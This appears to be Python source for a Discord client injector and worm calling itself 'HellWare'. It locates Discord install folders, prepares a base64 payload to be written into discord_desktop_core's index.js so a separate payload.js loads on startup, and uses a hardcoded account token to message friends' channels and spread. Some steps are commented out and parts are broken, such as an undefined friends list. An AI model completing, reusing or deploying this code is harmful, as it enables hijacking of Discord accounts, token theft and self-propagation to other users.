import ctypes, os, subprocess, time, threading, sys, requests
from colorama import Fore

debug = True
pl = 'bW9kdWxlLmV4cG9ydHMgPSByZXF1aXJlKCcuL2NvcmUuYXNhcicpOwpjb25zdCB7IGpvaW4gfSA9IHJlcXVpcmUoInBhdGgiKTsKcHJvY2Vzcy5lbnYuQ2xpZW50RGlyZWN0b3J5ID0gam9pbihfX2Rpcm5hbWUsICdpbmplY3Rpb24nKTsKcmVxdWlyZShgJHtwcm9XY2Vzcy5lbnYuQ2xpZW50RGlyZWN0b3J5fVxccGF5bG9hZC5qc2ApOw=='


def debugMessage(message):
    if debug == True:
        print(f'{Fore.MAGENTA}[ DEBUG ]{Fore.WHITE} {message}')

debugMessage('Detected PopOS')

def debugErrorMessage(message):
    if debug == True: print(f'{Fore.RED}[ ERROR ]{Fore.WHITE} {message}')

def printLine():
    if debug == True: print(f'{Fore.WHITE}='*50)

def adminPerms():
    try: admin = os.getuid() == 0
    except AttributeError: admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
    debugMessage(f'Admin User : {admin}')
    printLine()

def execute(command, wait = False):
    debugMessage(f'Executed : {command}, {wait}')
    process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE)
    if wait: process.wait()

def findVersion(locations):
    versions = []
    injectable = []
    for location in locations:
        printLine()
        try:
            location = location.replace('\\', '/')
            name = location.split('Local/')[1].replace('/', '')
            debugMessage(f'{Fore.YELLOW}Testing For {name}')
            for x in os.listdir(location):
                debugMessage(f'Listing : {x}')
                if x.startswith("app-"):
                    versions.append(x[4:])
            versions.sort(key = lambda x: int(x.replace(".", "")))
            latestVersion = "app-" + versions[len(versions) - 1]
            debugMessage(f'{name} Version Found : {latestVersion}')
            injectable.append(f'C:\\Users\\{os.getlogin()}\\AppData\\Local\\DiscordPTB\\{latestVersion}\\modules\\discord_desktop_core-1\\discord_desktop_core\\index.js')
        except Exception as e:
            debugErrorMessage(f'Error : {e}')
    return injectable

def returnFreinds(token) -> list:
    friends = list()
    request = requests.get('https://discord.com/api/v6/users/@me/relationships', headers={'content': token})
    print(request.text)

def spread():
    userTokens = ['ODQxNzgwODQxNDg2MzUyNDg0.YJrwFQ.MRmiHj3vFulAWTxZ-fFMc0iatac']
    printLine()
    debugMessage(f'Starting Spread...')
    debugMessage(f'Spreading over {len(userTokens)} account(s).')
    printLine()
    for token in userTokens:
        print(returnFreinds(token))
        printLine()
        debugMessage(f'Starting Spread...')
        debugMessage(f'Spreading over {len(fr)} friends(s).')
        printLine()
        for channel in fr:
            debugMessage(f'Message Sending to {channel}')
            spreadMessage = {'content': 'HellWare ran, this is a test message.'}
            endpoint = f'https://discord.com/api/v9/channels/{channel}/messages'
            requests.post(url=endpoint, data=spreadMessage, headers={'authorization': token})
        printLine()
    printLine()

def inject():
    adminPerms()
    processeNum = 0

    processes = ['discord.exe', 'discordptb.exe']

    locations = [
        f'C:\\Users\\{os.getlogin()}\\AppData\\Local\\DiscordPTB\\', 
        f'C:\\Users\\{os.getlogin()}\\AppData\\Local\\DiscordCanary\\'
    ]
    
    for discord in processes:
        processeNum += 1
        debugMessage(f'Ended : {discord} | {processeNum} / {len(processes)}')
        #execute(f'wmic process where name=\'{discord}\' delete', True)

    for location in findVersion(locations):
        debugMessage(f'Payload : {pl}')
        payload = f'atob("{pl}");'
        #f=open(file=location, mode='w').write(payload)
        debugMessage(f'Injected into {location}')    

    spread()

inject()